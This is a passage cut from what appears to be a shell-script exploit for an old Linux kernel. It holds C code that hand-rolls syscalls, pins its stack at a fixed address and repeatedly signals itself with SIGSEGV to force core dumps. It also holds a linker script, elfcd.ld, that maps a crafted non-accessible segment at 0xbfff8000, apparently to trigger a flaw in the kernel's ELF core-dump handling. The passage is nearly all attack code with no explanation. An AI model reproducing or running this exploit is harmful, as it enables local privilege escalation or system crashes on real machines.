#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <syscall.h>

#include <sys/syscall.h>

#include <asm/page.h>

#define __NR_sys_read __NR_read
#define __NR_sys_kill __NR_kill
#define __NR_sys_getpid __NR_getpid


char stack[4096 * 6];
static int errno;


inline _syscall3(int, sys_read, int, a, void*, b, int, l);
inline _syscall2(int, sys_kill, int, c, int, a);
inline _syscall0(int, sys_getpid);


// yeah, lets do it
void killme()
{
char c='a';
int pid;

pid = sys_getpid();
for(;;) {
sys_read(0, &c, 1);
sys_kill(pid, 11);
}
}


// safe stack stub
__asm__(
" nop \n"
"_start: movl \$0xbfff6ffc, %esp \n"
" jmp killme \n"
".global _start \n"
);
__EOF__
cat <<__EOF__>elfcd.ld
OUTPUT_FORMAT("elf32-i386", "elf32-i386",
"elf32-i386")
OUTPUT_ARCH(i386)
ENTRY(_start)
SEARCH_DIR(/lib); SEARCH_DIR(/usr/lib); SEARCH_DIR(/usr/local/lib); 
SEARCH_DIR(/usr/i486-suse-linux/lib);

MEMORY
{
ram (rwxali) : ORIGIN = 0xbfff0000, LENGTH = 0x8000
rom (x) : ORIGIN = 0xbfff8000, LENGTH = 0x10000
}

PHDRS
{
headers PT_PHDR PHDRS ;
text PT_LOAD FILEHDR PHDRS ;
fuckme PT_LOAD AT (0xbfff8000) FLAGS (0x00) ;
}

SECTIONS
{

.dupa 0xbfff8000 : AT (0xbfff8000) { LONG(0xdeadbeef); _bstart = . ; . += 0x7000; } >rom :fuckme

. = 0xbfff0000 + SIZEOF_HEADERS;
.text : { *(.text) } >ram :text
.data : { *(.data) } >ram :text
.bss :
{
*(.dynbss)
*(.bss)
*(.bss.*)
*(.gnu.linkonce.b.*)
*(COMMON)
. = ALIGN(32 / 8);
} >ram :text

}